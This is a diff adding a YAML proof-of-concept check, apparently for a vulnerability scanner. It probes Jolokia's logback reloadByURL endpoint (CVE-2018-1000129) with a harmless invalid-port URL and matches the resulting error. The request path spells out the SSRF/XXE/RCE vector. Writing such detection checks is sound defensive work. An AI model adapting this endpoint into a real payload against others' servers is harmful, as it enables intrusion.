@@ -1,0 +1,15 @@
+name: poc-yaml-jolokia-ssrf-xxe-rce
+rules:
+  - method: GET
+    path: >-
+      /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/localhost:99999!/logback.xml
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"\"java.lang.IllegalArgumentException\",\"error\":\"java.lang.IllegalArgumentException : port out of range:99999\",\"status\":400")
+detail:
+  author: mariobrow(https://github.com/amirnsahmad/)
+  links:
+    - https://www.cvedetails.com/cve/CVE-2018-1000129/
+    - https://github.com/pyn3rd/Spring-Boot-Vulnerability
